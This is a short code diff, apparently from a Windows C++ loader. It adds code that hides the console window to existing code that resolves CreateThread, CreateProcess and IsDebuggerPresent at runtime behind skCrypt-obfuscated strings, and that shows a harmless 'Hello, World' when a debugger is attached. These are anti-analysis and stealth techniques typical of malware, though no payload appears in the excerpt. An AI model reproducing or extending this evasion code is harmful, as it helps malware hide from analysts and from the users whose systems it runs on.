@@ -24,8 +24,12 @@ void Thread(void* data);
 typedef HANDLE(WINAPI* CreateThreadCustom)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, __drv_aliasesMem LPVOID, DWORD, LPDWORD);
 typedef BOOL(WINAPI* IsDebPresent)();
 typedef BOOL(WINAPI* CreateProcessCustom)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
+typedef BOOL(WINAPI* ShowWindowCustom)(HWND hWnd, int nCmdShow);
 
 int main(int argc, char** argv) {
+	ShowWindowCustom ShowWindow = (ShowWindowCustom)GetProcAddress(GetModuleHandleA("user32.dll"), skCrypt("ShowWindow"));
+	ShowWindow(GetConsoleWindow(), 0); // SW_HIDE
+
 	IsDebPresent isDebPresent = (IsDebPresent)GetProcAddress(GetModuleHandleA(skCrypt("kernel32.dll")), skCrypt("IsDebuggerPresent"));
 	if (isDebPresent()) {
 		std::cout << "Hello, World" << std::endl;
